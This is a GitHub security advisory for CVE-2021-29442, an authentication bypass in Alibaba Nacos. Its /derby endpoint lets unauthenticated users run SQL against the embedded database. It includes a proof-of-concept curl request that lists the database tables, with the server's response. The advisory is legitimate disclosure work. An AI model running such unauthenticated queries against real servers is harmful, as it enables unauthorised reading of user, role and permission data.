# [H] Authentication bypass for specific endpoint

## Summary
Severity: High
Advisory: GHSA-xv5h-v7jh-p2qh
CVE: CVE-2021-29442
CWE: CWE-306
Ecosystem: Maven
Published: 2021-04-27
Source: https://github.com/advisories/GHSA-xv5h-v7jh-p2qh
Type: github-advisory

## Affected
- Maven: `com.alibaba.nacos:nacos-common` — affected >=0 <1.4.1

## Details
The [`ConfigOpsController`](https://github.com/alibaba/nacos/blob/57459227863485d064ff25b3d5e24e714dcf218f/config/src/main/java/com/alibaba/nacos/config/server/controller/ConfigOpsController.java) lets the user perform management operations like querying the database or even wiping it out. While the [`/data/remove`](https://github.com/alibaba/nacos/blob/57459227863485d064ff25b3d5e24e714dcf218f/config/src/main/java/com/alibaba/nacos/config/server/controller/ConfigOpsController.java#L133-L135) endpoint is properly protected with the `@Secured` annotation, the [`/derby`](https://github.com/alibaba/nacos/blob/57459227863485d064ff25b3d5e24e714dcf218f/config/src/main/java/com/alibaba/nacos/config/server/controller/ConfigOpsController.java#L99-L100) endpoint is not protected and can be openly accessed by unauthenticated users. 

For example, the following request will list the tables of the database:
```
❯ curl -X GET 'http://console.nacos.io/nacos/v1/cs/ops/derby?sql=select+st.tablename+from+sys.systables+st'
{"code":200,"message":null,"data":[{"TABLENAME":"APP_CONFIGDATA_RELATION_PUBS"},{"TABLENAME":"APP_CONFIGDATA_RELATION_SUBS"},{"TABLENAME":"APP_LIST"},{"TABLENAME":"CONFIG_INFO"},{"TABLENAME":"CONFIG_INFO_AGGR"},{"TABLENAME":"CONFIG_INFO_BETA"},{"TABLENAME":"CONFIG_INFO_TAG"},{"TABLENAME":"CONFIG_TAGS_RELATION"},{"TABLENAME":"GROUP_CAPACITY"},{"TABLENAME":"HIS_CONFIG_INFO"},{"TABLENAME":"PERMISSIONS"},{"TABLENAME":"ROLES"},{"TABLENAME":"SYSALIASES"},{"TABLENAME":"SYSCHECKS"},{"TABLENAME":"SYSCOLPERMS"},{"TABLENAME":"SYSCOLUMNS"},{"TABLENAME":"SYSCONGLOMERATES"},{"TABLENAME":"SYSCONSTRAINTS"},{"TABLENAME":"SYSDEPENDS"},{"TABLENAME":"SYSDUMMY1"},{"TABLENAME":"SYSFILES"},{"TABLENAME":"SYSFOREIGNKEYS"},{"TABLENAME":"SYSKEYS"},{"TABLENAME":"SYSPERMS"},{"TABLENAME":"SYSROLES"},{"TABLENAME":"SYSROUTINEPERMS"},{"TABLENAME":"SYSSCHEMAS"},{"TABLENAME":"SYSSEQUENCES"},{"TABLENAME":"SYSSTATEMENTS"},{"TABLENAME":"SYSSTATISTICS"},{"TABLENAME":"SYSTABLEPERMS"},{"TABLENAME":"SYSTABLES"},{"TABLENAME":"SYSTRIGGERS"},{"TABLENAME":"SYSUSERS"},{"TABLENAME":"SYSVIEWS"},{"TABLENAME":"TENANT_CAPACITY"},{"TABLENAME":"TENANT_INFO"},{"TABLENAME":"USERS"}]}% 
```

These endpoints are only valid when using embedded storage (derby DB) so this issue should not affect those installations using external storage (e.g. mysql)

## References
- https://nvd.nist.gov/vuln/detail/CVE-2021-29442
- https://github.com/alibaba/nacos/issues/4463
- https://github.com/alibaba/nacos/pull/4517
- https://github.com/advisories/GHSA-36hp-jr8h-556f
